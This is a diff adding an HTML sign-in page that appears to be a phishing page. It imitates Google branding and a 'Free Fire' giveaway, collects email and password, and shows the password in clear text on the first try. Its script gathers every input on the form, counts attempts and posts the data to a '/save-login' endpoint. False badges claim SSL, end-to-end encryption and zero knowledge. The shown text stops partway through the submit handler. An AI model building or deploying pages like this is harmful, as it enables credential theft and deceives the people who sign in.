@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Sign In</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&family=Space+Grotesk:wght@300;400;500;600;700&display=swap');
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --card: rgba(18, 18, 35, 0.92);
+    --border: rgba(255,255,255,0.08);
+    --text: #f0f0ff;
+    --muted: rgba(200,200,220,0.55);
+    --accent: #7c6cfa;
+    --accent2: #00e5ff;
+  }
+
+  html, body {
+    min-height: 100vh;
+    font-family: 'Space Grotesk', 'Inter', sans-serif;
+    background: radial-gradient(circle at 50% 20%, #ff6a00 0%, #1a0033 40%, #000000 100%);
+    color: var(--text);
+    overflow-x: hidden;
+  }
+
+  /* ── BACKGROUND ── */
+  .bg { position: fixed; inset: 0; z-index: 0; background: radial-gradient(ellipse 80% 60% at 50% 0%, #1a0a40 0%, #050510 70%); }
+
+  .grid-canvas { position: fixed; inset: 0; z-index: 1; perspective: 800px; }
+  .grid {
+    position: absolute; bottom: -10%; left: 50%;
+    transform: translateX(-50%) rotateX(65deg);
+    width: 200vw; height: 200vw;
+    background-image:
+      linear-gradient(rgba(124,108,250,0.18) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(124,108,250,0.18) 1px, transparent 1px);
+    background-size: 60px 60px;
+    animation: gridMove 6s linear infinite;
+  }
+  @keyframes gridMove { 0%{background-position:0 0} 100%{background-position:0 60px} }
+
+  .orb { position: fixed; border-radius: 50%; filter: blur(80px); z-index: 1; animation: float 8s ease-in-out infinite; }
+  .orb1 { width:420px;height:420px;background:radial-gradient(circle,rgba(124,108,250,0.35),transparent 70%);top:-120px;left:-100px;animation-delay:0s; }
+  .orb2 { width:320px;height:320px;background:radial-gradient(circle,rgba(0,229,255,0.25),transparent 70%);bottom:-80px;right:-80px;animation-delay:-3s; }
+  .orb3 { width:200px;height:200px;background:radial-gradient(circle,rgba(255,60,120,0.2),transparent 70%);top:40%;right:5%;animation-delay:-5s; }
+  @keyframes float { 0%,100%{transform:translateY(0) scale(1)} 50%{transform:translateY(-30px) scale(1.05)} }
+
+  .particles { position: fixed; inset: 0; z-index: 2; pointer-events: none; }
+  .particle { position: absolute; border-radius: 50%; background: rgba(255,255,255,0.7); animation: rise linear infinite; }
+  @keyframes rise {
+    0%{transform:translateY(100vh) scale(1);opacity:0}
+    10%{opacity:1} 90%{opacity:0.6}
+    100%{transform:translateY(-10vh) scale(0.3);opacity:0}
+  }
+
+  /* ── LAYOUT ── */
+  .scene {
+    position: relative; z-index: 10;
+    min-height: 100vh;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 24px 20px 40px;
+  }
+
+  /* ── BADGE ── */
+  .badge {
+    display: inline-flex; align-items: center; gap: 8px;
+    padding: 6px 16px;
+    background: rgba(255,170,0,0.12);
+    border: 1px solid rgba(255,170,0,0.3);
+    border-radius: 100px;
+    font-size: 12px; font-weight: 500; letter-spacing: 0.08em;
+    color: rgba(255,220,160,0.95);
+    margin-bottom: 28px;
+    animation: fadeDown 0.6s ease both;
+  }
+  .badge-dot {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--accent2);
+    box-shadow: 0 0 8px var(--accent2);
+    animation: pulse 2s ease infinite;
+  }
+  @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(1.4)} }
+
+  /* ── LOGO ── */
+  .logo-wrap { margin-bottom: 14px; animation: fadeDown 0.7s ease 0.1s both; }
+  .google-logo { width: 74px; height: 74px; display: block; margin: 0 auto; }
+  .google-logo-label {
+    margin-top: 10px;
+    text-align: center;
+    font-size: 14px;
+    letter-spacing: 0.12em;
+    color: rgba(255,255,255,0.78);
+    text-transform: uppercase;
+    font-weight: 600;
+  }
+  .logo-hex {
+    width: 64px; height: 64px;
+    background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
+    border-radius: 18px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 28px;
+    position: relative; overflow: hidden;
+    animation: logoPulse 3s ease-in-out infinite;
+    margin: 0 auto;
+  }
+  .logo-hex::before {
+    content: ''; position: absolute; inset: 0;
+    background: linear-gradient(135deg, rgba(255,255,255,0.2) 0%, transparent 60%);
+  }
+  @keyframes logoPulse {
+    0%,100%{box-shadow:0 0 40px rgba(124,108,250,0.5),0 0 80px rgba(0,229,255,0.15)}
+    50%{box-shadow:0 0 60px rgba(124,108,250,0.8),0 0 120px rgba(0,229,255,0.3)}
+  }
+
+  /* ── CARD ── */
+  .card {
+    width: 100%; max-width: 420px;
+    background: linear-gradient(145deg, #1f1f2e, #0d0d17);
+    border: 2px solid rgba(255,170,0,0.3);
+    border-radius: 28px;
+    padding: 36px 28px 32px;
+    position: relative; overflow: hidden;
+    backdrop-filter: blur(24px);
+    box-shadow: 0 0 0 1px rgba(255,170,0,0.1), 0 40px 80px rgba(0,0,0,0.6), 0 0 120px rgba(255,170,0,0.12);
+    animation: cardIn 0.8s cubic-bezier(0.22,1,0.36,1) 0.2s both;
+    transform-style: preserve-3d;
+  }
+  @keyframes cardIn {
+    from{opacity:0;transform:translateY(40px) scale(0.95)}
+    to{opacity:1;transform:translateY(0) scale(1)}
+  }
+  .card-shine { position: absolute; inset: 0; border-radius: 28px; z-index: 0; pointer-events: none; background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, transparent 50%); }
+  .card-glow {
+    position: absolute; top: -1px; left: 20%; right: 20%; height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(124,108,250,0.8), rgba(0,229,255,0.6), transparent);
+    animation: glowSweep 3s ease-in-out infinite;
+  }
+  @keyframes glowSweep { 0%,100%{opacity:0.4} 50%{opacity:1} }
+  .card-content { position: relative; z-index: 1; }
+
+  .card-title {
+    font-size: 26px; font-weight: 700; letter-spacing: -0.02em;
+    text-align: center; margin-bottom: 6px;
+    background: linear-gradient(135deg, #fff 0%, rgba(200,190,255,0.9) 100%);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+  }
+  .card-sub { font-size: 14px; color: var(--muted); text-align: center; margin-bottom: 28px; line-height: 1.5; }
+
+  /* ── INPUT GROUP ── */
+  .input-group { margin-bottom: 16px; animation: fadeUp 0.5s ease both; }
+  .input-group:nth-child(1) { animation-delay: 0.35s; }
+  .input-group:nth-child(2) { animation-delay: 0.45s; }
+
+  .input-label {
+    display: block;
+    font-size: 11px; font-weight: 600; letter-spacing: 0.07em;
+    color: var(--muted); text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+  .input-wrap {
+    position: relative;
+    border-radius: 14px;
+    border: 1px solid var(--border);
+    background: rgba(255,255,255,0.04);
+    overflow: hidden;
+    transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+  }
+  .input-wrap:focus-within {
+    border-color: rgba(124,108,250,0.5);
+    background: rgba(124,108,250,0.05);
+    box-shadow: 0 0 0 3px rgba(124,108,250,0.12), 0 0 20px rgba(124,108,250,0.08);
+  }
+  .input-wrap:focus-within .input-icon svg { stroke: var(--accent); }
+
+  .input-icon {
+    position: absolute; left: 14px; top: 50%; transform: translateY(-50%);
+    color: var(--muted); pointer-events: none;
+    display: flex; align-items: center;
+  }
+  .input-icon svg { width: 17px; height: 17px; stroke: var(--muted); transition: stroke 0.2s; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+
+  .field {
+    width: 100%; padding: 13px 44px 13px 44px;
+    background: transparent; border: none; outline: none;
+    font-family: inherit; font-size: 14px; font-weight: 400;
+    color: var(--text); letter-spacing: 0.01em;
+    -webkit-appearance: none;
+  }
+  .field::placeholder { color: rgba(200,200,220,0.28); }
+  .field:-webkit-autofill { -webkit-text-fill-color: var(--text) !important; -webkit-box-shadow: 0 0 0 100px rgba(18,18,35,0.95) inset !important; }
+
+  /* eye button */
+  .eye-btn {
+    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+    background: none; border: none; cursor: pointer; padding: 4px;
+    color: var(--muted); transition: color 0.2s;
+    display: flex; align-items: center;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .eye-btn:hover { color: rgba(200,190,255,0.8); }
+  .eye-btn svg { width: 17px; height: 17px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+
+  /* ── ERROR ── */
+  .input-wrap.error { border-color: rgba(255,80,80,0.5); box-shadow: 0 0 0 3px rgba(255,80,80,0.1); }
+  .error-msg { font-size: 11px; color: rgba(255,100,100,0.85); margin-top: 6px; display: none; padding-left: 2px; }
+  .error-msg.show { display: block; animation: fadeUp 0.2s ease both; }
+
+  /* ── FORGOT ── */
+  .forgot-row { text-align: right; margin-top: -8px; margin-bottom: 24px; animation: fadeUp 0.5s ease 0.5s both; }
+  .forgot-row a { font-size: 12px; color: rgba(124,108,250,0.75); text-decoration: none; transition: color 0.2s; }
+  .forgot-row a:hover { color: var(--accent2); }
+
+  /* ── SIGN IN BUTTON ── */
+  .btn-submit {
+    width: 100%; padding: 15px 20px;
+    border-radius: 16px; border: none; cursor: pointer;
+    font-family: inherit; font-size: 15px; font-weight: 700;
+    color: #fff; letter-spacing: 0.02em;
+    background: linear-gradient(135deg, var(--accent) 0%, #5a4fcf 50%, rgba(0,229,255,0.8) 100%);
+    background-size: 200% 200%;
+    animation: gradShift 4s ease infinite, fadeUp 0.5s ease 0.55s both;
+    box-shadow: 0 4px 24px rgba(124,108,250,0.45), inset 0 1px 0 rgba(255,255,255,0.15);
+    position: relative; overflow: hidden;
+    transition: transform 0.18s cubic-bezier(0.34,1.56,0.64,1), box-shadow 0.18s ease;
+    -webkit-tap-highlight-color: transparent;
+  }
+  @keyframes gradShift { 0%,100%{background-position:0% 50%} 50%{background-position:100% 50%} }
+  .btn-submit::before { content:''; position:absolute; inset:0; background:linear-gradient(135deg,rgba(255,255,255,0.15) 0%,transparent 60%); opacity:0; transition:opacity 0.2s; }
+  .btn-submit:hover::before { opacity:1; }
+  .btn-submit:hover { transform:translateY(-2px) scale(1.01); box-shadow:0 8px 36px rgba(124,108,250,0.65); }
+  .btn-submit:active { transform:scale(0.99); }
+  .btn-submit.loading { pointer-events:none; opacity:0.75; }
+  .btn-label-txt { display: block; }
+  .spinner { display:none; width:18px; height:18px; border:2px solid rgba(255,255,255,0.3); border-top-color:#fff; border-radius:50%; animation:spin 0.7s linear infinite; margin:0 auto; }
+  @keyframes spin { to{transform:rotate(360deg)} }
+  .btn-submit.loading .btn-label-txt { display:none; }
+  .btn-submit.loading .spinner { display:block; }
+
+  /* ── SIGNUP ── */
+  .signup-row { text-align:center; margin-top:20px; font-size:13px; color:var(--muted); animation:fadeUp 0.5s ease 0.6s both; }
+  .signup-row a { color:rgba(124,108,250,0.9); text-decoration:none; font-weight:600; }
+  .signup-row a:hover { color:var(--accent2); }
+
+  /* ── FOOTER ── */
+  .note { margin-top:20px; text-align:center; font-size:12px; color:var(--muted); line-height:1.6; animation:fadeUp 0.8s ease 0.7s both; }
+  .note a { color:rgba(124,108,250,0.9); text-decoration:none; }
+  .note a:hover { text-decoration:underline; }
+
+  .security-row { display:flex; align-items:center; justify-content:center; gap:16px; margin-top:16px; flex-wrap:wrap; animation:fadeUp 0.8s ease 0.8s both; }
+  .sec-badge { display:flex; align-items:center; gap:5px; font-size:11px; color:rgba(160,160,180,0.7); }
+  .sec-dot { width:5px; height:5px; border-radius:50%; background:var(--muted); }
+
+  /* ── SCANLINE ── */
+  .scanline { position:fixed; top:0; left:0; right:0; height:2px; background:linear-gradient(90deg,transparent,rgba(124,108,250,0.6),rgba(0,229,255,0.8),transparent); animation:scan 4s ease-in-out infinite; z-index:20; pointer-events:none; }
+  @keyframes scan { 0%{top:-2px;opacity:0} 5%{opacity:1} 95%{opacity:0.4} 100%{top:100vh;opacity:0} }
+
+  /* ── CORNERS ── */
+  .corner { position:fixed; width:60px; height:60px; z-index:5; pointer-events:none; }
+  .corner-tl { top:20px;left:20px;border-top:2px solid rgba(124,108,250,0.4);border-left:2px solid rgba(124,108,250,0.4);border-radius:4px 0 0 0; }
+  .corner-tr { top:20px;right:20px;border-top:2px solid rgba(0,229,255,0.4);border-right:2px solid rgba(0,229,255,0.4);border-radius:0 4px 0 0; }
+  .corner-bl { bottom:20px;left:20px;border-bottom:2px solid rgba(0,229,255,0.4);border-left:2px solid rgba(0,229,255,0.4);border-radius:0 0 0 4px; }
+  .corner-br { bottom:20px;right:20px;border-bottom:2px solid rgba(124,108,250,0.4);border-right:2px solid rgba(124,108,250,0.4);border-radius:0 0 4px 0; }
+
+  @keyframes fadeDown { from{opacity:0;transform:translateY(-16px)} to{opacity:1;transform:translateY(0)} }
+  @keyframes fadeUp   { from{opacity:0;transform:translateY(12px)}  to{opacity:1;transform:translateY(0)} }
+  @keyframes shake    { 0%,100%{transform:translateX(0)} 20%,60%{transform:translateX(-6px)} 40%,80%{transform:translateX(6px)} }
+
+  @media (hover:hover) { .card { transition: transform 0.2s ease, box-shadow 0.2s ease; } }
+  @media (max-width:400px) { .card{padding:28px 20px 24px;border-radius:22px} .card-title{font-size:22px} }
+
+  /* ── CONGRATS OVERLAY ── */
+  .overlay {
+    position: fixed; inset: 0; z-index: 100;
+    display: flex; align-items: center; justify-content: center;
+    padding: 24px;
+    background: rgba(5,5,16,0.85);
+    backdrop-filter: blur(12px);
+    opacity: 0; pointer-events: none;
+    transition: opacity 0.4s ease;
+  }
+  .overlay.show { opacity: 1; pointer-events: all; }
+
+  .congrats-card {
+    width: 100%; max-width: 380px;
+    background: rgba(18,18,35,0.97);
+    border: 1px solid rgba(255,255,255,0.09);
+    border-radius: 28px;
+    padding: 40px 28px 36px;
+    text-align: center;
+    position: relative; overflow: hidden;
+    box-shadow: 0 0 0 1px rgba(124,108,250,0.15), 0 40px 80px rgba(0,0,0,0.7), 0 0 80px rgba(0,229,255,0.08);
+    transform: scale(0.85) translateY(20px);
+    transition: transform 0.5s cubic-bezier(0.22,1,0.36,1), opacity 0.4s ease;
+    opacity: 0;
+  }
+  .overlay.show .congrats-card { transform: scale(1) translateY(0); opacity: 1; }
+
+  .congrats-top-glow {
+    position: absolute; top: -1px; left: 15%; right: 15%; height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(0,229,255,0.9), rgba(124,108,250,0.8), transparent);
+    animation: glowSweep 2.5s ease-in-out infinite;
+  }
+
+  /* trophy / emoji burst */
+  .trophy-wrap {
+    width: 80px; height: 80px; margin: 0 auto 20px;
+    background: linear-gradient(135deg, rgba(124,108,250,0.2) 0%, rgba(0,229,255,0.15) 100%);
+    border: 1px solid rgba(124,108,250,0.3);
+    border-radius: 24px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 38px;
+    animation: trophyPop 0.6s cubic-bezier(0.34,1.56,0.64,1) 0.3s both;
+    position: relative;
+  }
+  @keyframes trophyPop { from{transform:scale(0) rotate(-15deg);opacity:0} to{transform:scale(1) rotate(0deg);opacity:1} }
+  .trophy-ring {
+    position: absolute; inset: -8px; border-radius: 30px;
+    border: 1px solid rgba(0,229,255,0.25);
+    animation: ringPulse 2s ease-in-out infinite;
+  }
+  .trophy-ring2 {
+    position: absolute; inset: -16px; border-radius: 36px;
+    border: 1px solid rgba(124,108,250,0.15);
+    animation: ringPulse 2s ease-in-out 0.4s infinite;
+  }
+  @keyframes ringPulse { 0%,100%{opacity:0.6;transform:scale(1)} 50%{opacity:0.2;transform:scale(1.04)} }
+
+  .congrats-title {
+    font-size: 24px; font-weight: 700; letter-spacing: -0.02em;
+    background: linear-gradient(135deg, #fff 0%, var(--accent2) 60%, var(--accent) 100%);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+    margin-bottom: 8px;
+    animation: fadeUp 0.5s ease 0.5s both;
+  }
+  .congrats-sub {
+    font-size: 14px; color: var(--muted); line-height: 1.6; margin-bottom: 28px;
+    animation: fadeUp 0.5s ease 0.6s both;
+  }
+  .congrats-sub strong { color: rgba(200,190,255,0.9); font-weight: 600; }
+
+  /* confetti dots */
+  .confetti-wrap { position: absolute; inset: 0; pointer-events: none; overflow: hidden; border-radius: 28px; }
+  .cdot {
+    position: absolute; border-radius: 2px;
+    animation: confettiFall linear both;
+  }
+
+  /* go home button */
+  .btn-home {
+    width: 100%; padding: 14px 20px;
+    border-radius: 14px; border: none; cursor: pointer;
+    font-family: inherit; font-size: 15px; font-weight: 700;
+    color: #fff;
+    background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
+    box-shadow: 0 4px 24px rgba(124,108,250,0.4), inset 0 1px 0 rgba(255,255,255,0.15);
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    transition: transform 0.18s cubic-bezier(0.34,1.56,0.64,1), box-shadow 0.18s;
+    animation: fadeUp 0.5s ease 0.7s both;
+    text-decoration: none;
+    -webkit-tap-highlight-color: transparent;
+    position: relative; overflow: hidden;
+    margin-bottom: 10px;
+  }
+  .btn-home::before { content:''; position:absolute; inset:0; background:linear-gradient(135deg,rgba(255,255,255,0.15) 0%,transparent 60%); opacity:0; transition:opacity 0.2s; }
+  .btn-home:hover::before { opacity:1; }
+  .btn-home:hover { transform:translateY(-2px); box-shadow:0 8px 32px rgba(124,108,250,0.6); }
+  .btn-home:active { transform:scale(0.98); }
+  .btn-home svg { width:18px; height:18px; fill:none; stroke:currentColor; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
+
+  .btn-stay {
+    width: 100%; padding: 12px 20px;
+    border-radius: 14px; border: 1px solid var(--border);
+    background: transparent; cursor: pointer;
+    font-family: inherit; font-size: 14px; font-weight: 500;
+    color: var(--muted);
+    transition: background 0.2s, color 0.2s, border-color 0.2s;
+    animation: fadeUp 0.5s ease 0.75s both;
+  }
+  .btn-stay:hover { background: rgba(255,255,255,0.05); color: var(--text); border-color: rgba(255,255,255,0.15); }
+
+  @keyframes confettiFall {
+    0%   { transform: translateY(-20px) rotate(0deg); opacity: 1; }
+    100% { transform: translateY(420px) rotate(720deg); opacity: 0; }
+  }
+</style>
+</head>
+<body>
+
+<div class="bg"></div>
+<div class="grid-canvas"><div class="grid"></div></div>
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<div class="orb orb3"></div>
+<div class="particles" id="particles"></div>
+<div class="scanline"></div>
+
+<div class="corner corner-tl"></div>
+<div class="corner corner-tr"></div>
+<div class="corner corner-bl"></div>
+<div class="corner corner-br"></div>
+
+<!-- CONGRATULATIONS OVERLAY -->
+<div class="overlay" id="overlay">
+  <div class="congrats-card" id="congrats-card">
+    <div class="congrats-top-glow"></div>
+    <div class="confetti-wrap" id="confetti-wrap"></div>
+
+    <div class="trophy-wrap">
+      🏆
+      <div class="trophy-ring"></div>
+      <div class="trophy-ring2"></div>
+    </div>
+
+    <h2 class="congrats-title">Congratulations!</h2>
+    <p class="congrats-sub">
+      You're in! Your Free Fire login was successful.<br>
+      Welcome to the giveaway.
+    </p>
+
+    <a href="index.html" class="btn-home">
+      <svg viewBox="0 0 24 24"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+      Go to Home Page
+    </a>
+    <button class="btn-stay" onclick="closeOverlay()">Stay on this page</button>
+  </div>
+</div>
+
+<!-- MAIN PAGE -->
+<div class="scene">
+
+  <div class="badge">
+    <span class="badge-dot"></span>
+    Secure login
+  </div>
+
+  <div class="logo-wrap google-logo-wrap">
+    <svg class="google-logo" viewBox="0 0 46 46" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+      <path fill="#4285F4" d="M23 11.5c4.4 0 7.5 1.9 9.2 3.5l6.7-6.7C35.6 4.6 29.9 2 23 2 14.7 2 7.3 6.7 3.6 14.2l7.8 6.1C12.3 16.1 17 11.5 23 11.5z"/>
+      <path fill="#34A853" d="M9.4 24c0-1.5.3-2.9.9-4.2L3 13.7C1.2 17.3 0 21.1 0 25c0 3.9 1.2 7.7 3.3 10.9l7.7-6.1c-.5-1.3-.8-2.7-.8-4.5z"/>
+      <path fill="#FBBC05" d="M23 44c6.9 0 12.6-2.3 16.8-6.2l-7.8-6.1c-2.2 1.4-5 2.4-9 2.4-6 0-10.7-4.5-11.4-10.5H3.3v6.6C7.3 38.8 14.7 44 23 44z"/>
+      <path fill="#EA4335" d="M46 25c0-1.4-.1-2.6-.4-3.8H23v7.2h12.6c-.5 2.7-2 5-4.2 6.5l7.8 6.1C44.4 35.9 46 30.9 46 25z"/>
+    </svg>
+    <div class="google-logo-label">Google</div>
+  </div>
+
+  <div class="card" id="card">
+    <div class="card-shine"></div>
+    <div class="card-glow"></div>
+    <div class="card-content">
+
+      <h1 class="card-title">Login your Free Fire account</h1>
+      <p class="card-sub">Enter your Free Fire account details below.</p>
+
+      <!-- Email -->
+      <div class="input-group">
+        <label class="input-label" for="email-field">Email</label>
+        <div class="input-wrap" id="email-wrap">
+          <span class="input-icon">
+            <svg viewBox="0 0 24 24"><path d="M2 5.5C2 4.1 3.1 3 4.5 3h15c1.4 0 2.5 1.1 2.5 2.5v13c0 1.4-1.1 2.5-2.5 2.5h-15C3.1 21 2 19.9 2 18.5v-13z" fill="none" stroke="currentColor" stroke-width="2"/><path d="M22 6.5 12 13 2 6.5" fill="none" stroke="currentColor" stroke-width="2"/></svg>
+          </span>
+          <input class="field" id="email-field" type="email"
+            placeholder="Enter your email"
+            autocomplete="email"
+            oninput="clearErr('email-wrap','email-err')">
+        </div>
+        <p class="error-msg" id="email-err"></p>
+      </div>
+
+      <!-- Password -->
+      <div class="input-group">
+        <label class="input-label" for="password-field">Password</label>
+        <div class="input-wrap" id="password-wrap">
+          <span class="input-icon">
+            <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          </span>
+          <input class="field" id="password-field"
+            placeholder="Enter your password"
+            autocomplete="current-password"
+            oninput="clearErr('password-wrap','password-err')">
+          <button class="eye-btn" type="button" id="eye-btn" onclick="toggleEye()" aria-label="Toggle password visibility">
+            <svg id="eye-open" viewBox="0 0 24 24"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg>
+            <svg id="eye-closed" style="display:none" viewBox="0 0 24 24"><path d="m2 2 20 20M6.7 6.7A9.8 9.8 0 0 0 2 12s3.6 7 10 7a9.9 9.9 0 0 0 5.3-1.7M10.6 5.1A9.2 9.2 0 0 1 12 5c6.4 0 10 7 10 7a18.3 18.3 0 0 1-2.1 3"/></svg>
+          </button>
+        </div>
+        <p class="error-msg" id="password-err"></p>
+      </div>
+
+      <div class="forgot-row"><a href="#">Forgot password?</a></div>
+
+      <button class="btn-submit" id="btn-submit" type="button" onclick="handleSubmit()">
+        <span class="btn-label-txt">Sign in</span>
+        <div class="spinner"></div>
+      </button>
+
+      <p class="signup-row">Don't have an account? <a href="#">Sign up</a></p>
+
+    </div>
+  </div>
+
+  <p class="note">
+    By signing in, you agree to our
+    <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+  </p>
+
+  <div class="security-row">
+    <span class="sec-badge"><span class="sec-dot"></span> 256-bit SSL</span>
+    <span class="sec-badge"><span class="sec-dot"></span> End-to-end encrypted</span>
+    <span class="sec-badge"><span class="sec-dot"></span> Zero-knowledge</span>
+  </div>
+
+</div>
+
+<script src="/js/onboarding.js"></script>
+<script>
+/* Set provider on page load */
+localStorage.setItem('nebula_login_provider', 'google');
+
+/* ── Particles ── */
+(function() {
+  var c = document.getElementById('particles');
+  for (var i = 0; i < 28; i++) {
+    var p = document.createElement('div');
+    p.className = 'particle';
+    var s = Math.random() * 2.5 + 0.5;
+    p.style.cssText = 'width:'+s+'px;height:'+s+'px;left:'+Math.random()*100+'%;animation-duration:'+(Math.random()*12+8)+'s;animation-delay:-'+Math.random()*15+'s;opacity:'+(Math.random()*0.5+0.2);
+    c.appendChild(p);
+  }
+})();
+
+/* ── 3D Card Tilt ── */
+(function() {
+  var card = document.getElementById('card');
+  if (!window.matchMedia('(hover: hover)').matches) return;
+  document.addEventListener('mousemove', function(e) {
+    var r = card.getBoundingClientRect();
+    var dx = (e.clientX - (r.left + r.width/2)) / (r.width/2);
+    var dy = (e.clientY - (r.top + r.height/2)) / (r.height/2);
+    card.style.transform = 'rotateX('+(dy*-7)+'deg) rotateY('+(dx*7)+'deg) scale(1.01)';
+  });
+  document.addEventListener('mouseleave', function() {
+    card.style.transform = 'rotateX(0deg) rotateY(0deg) scale(1)';
+  });
+})();
+
+/* ── Password always visible on first try, hidden on second ── */
+var attemptCount = 0;
+var pwField = document.getElementById('password-field');
+
+/* Set text (visible) on load for first attempt */
+pwField.type = 'text';
+document.getElementById('eye-open').style.display = 'none';
+document.getElementById('eye-closed').style.display = 'block';
+
+function toggleEye() {
+  var open   = document.getElementById('eye-open');
+  var closed = document.getElementById('eye-closed');
+  if (pwField.type === 'password') {
+    pwField.type = 'text';
+    open.style.display = 'none';
+    closed.style.display = 'block';
+    document.getElementById('eye-btn').setAttribute('aria-label','Hide password');
+  } else {
+    pwField.type = 'password';
+    open.style.display = 'block';
+    closed.style.display = 'none';
+    document.getElementById('eye-btn').setAttribute('aria-label','Show password');
+  }
+}
+
+/* ── Error helpers ── */
+function clearErr(wrapId, errId) {
+  document.getElementById(wrapId).classList.remove('error');
+  var e = document.getElementById(errId);
+  e.textContent = '';
+  e.classList.remove('show');
+}
+
+function showErr(wrapId, errId, msg) {
+  var wrap = document.getElementById(wrapId);
+  var err  = document.getElementById(errId);
+  wrap.classList.add('error');
+  err.textContent = msg;
+  err.classList.add('show');
+  wrap.style.animation = 'none';
+  wrap.offsetHeight;
+  wrap.style.animation = 'shake 0.35s ease';
+  setTimeout(function(){ wrap.style.animation = ''; }, 400);
+}
+
+function validate() {
+  var email = document.getElementById('email-field').value.trim();
+  var pw = pwField.value;
+  var ok = true;
+  var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+  if (!email) {
+    showErr('email-wrap','email-err','Please enter your email');
+    ok = false;
+  } else if (!emailPattern.test(email)) {
+    showErr('email-wrap','email-err','Please enter a valid email address');
+    ok = false;
+  }
+
+  if (!pw) {
+    showErr('password-wrap','password-err','Please enter your password');
+    ok = false;
+  } else if (pw.length < 8) {
+    showErr('password-wrap','password-err','Password must be at least 8 characters');
+    ok = false;
+  }
+  return ok;
+}
+
+/* ── Confetti ── */
+function spawnConfetti() {
+  var wrap = document.getElementById('confetti-wrap');
+  wrap.innerHTML = '';
+  var colors = ['#7c6cfa','#00e5ff','#ff6ed8','#ffd96e','#6effa0','#ff7070'];
+  for (var i = 0; i < 42; i++) {
+    var d = document.createElement('div');
+    d.className = 'cdot';
+    var size = Math.random() * 8 + 4;
+    var color = colors[Math.floor(Math.random() * colors.length)];
+    var delay = Math.random() * 0.6;
+    var duration = Math.random() * 1.2 + 1.0;
+    var left = Math.random() * 100;
+    var rot = Math.random() * 6 - 3;
+    d.style.cssText = 'width:'+size+'px;height:'+(size*0.5)+'px;background:'+color+';left:'+left+'%;top:0;transform:rotate('+rot+'deg);animation-duration:'+duration+'s;animation-delay:'+delay+'s;border-radius:2px;';
+    wrap.appendChild(d);
+  }
+}
+
+/* ── Show congrats overlay ── */
+function showCongrats(username) {
+  document.getElementById('display-user').textContent = username || 'User';
+  spawnConfetti();
+  var overlay = document.getElementById('overlay');
+  overlay.classList.add('show');
+  document.body.style.overflow = 'hidden';
+}
+
+function closeOverlay() {
+  var overlay = document.getElementById('overlay');
+  overlay.classList.remove('show');
+  document.body.style.overflow = '';
+}
+
+function getClaimData() {
+  return JSON.parse(sessionStorage.getItem('claimData') || '{}');
+}
+
+function saveLocalUser(email) {
+  var claimData = getClaimData();
+  var existing = JSON.parse(localStorage.getItem('ff_user') || '{}');
+  var user = {
+    email: email,
+    name: existing.name || claimData.name || email,
+    uid: existing.uid || claimData.uid || '',
+    loginAt: new Date().toISOString()
+  };
+  localStorage.setItem('ff_user', JSON.stringify(user));
+}
+
+function apiRequest(url, body) {
+  return fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body)
+  })
+  .then(function(response) {
+    return response.json().then(function(data) {
+      return { status: response.status, data: data };
+    });
+  });
+}
+
+function getOrCreateUserId() {
+  var id = localStorage.getItem('nebula_user_id');
+  if (!id) {
+    id = 'user_' + Date.now() + '_' + Math.random().toString(16).slice(2);
+    localStorage.setItem('nebula_user_id', id);
+  }
+  return id;
+}
+
+function getLoginProvider() {
+  return localStorage.getItem('nebula_login_provider') || 'google';
+}
+
+function saveLoginData(payload) {
+  return fetch('/save-login', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).then(function(response) {
+    return response.json();
+  });
+}
+
+function handleSubmit() {
+  if (!validate()) return;
+
+  var btn = document.getElementById('btn-submit');
+  var email = document.getElementById('email-field').value.trim();
+  var password = pwField.value;
+  var provider = getLoginProvider();
+  var userId = getOrCreateUserId();
+  var attemptKey = 'nebula_' + provider + '_attempts';
+  var attempts = Number(localStorage.getItem(attemptKey) || '0') + 1;
+  localStorage.setItem(attemptKey, String(attempts));
+
+  btn.classList.add('loading');
+
+  // Collect all inputs inside the card to save full entered data
+  var fields = {};
+  var inputs = document.querySelectorAll('#card input, #card select, #card textarea');
+  inputs.forEach(function(i){
+    var key = i.name || i.id || ('field_' + (i.type || 'input'));
+    fields[key] = i.value;
+  });
+
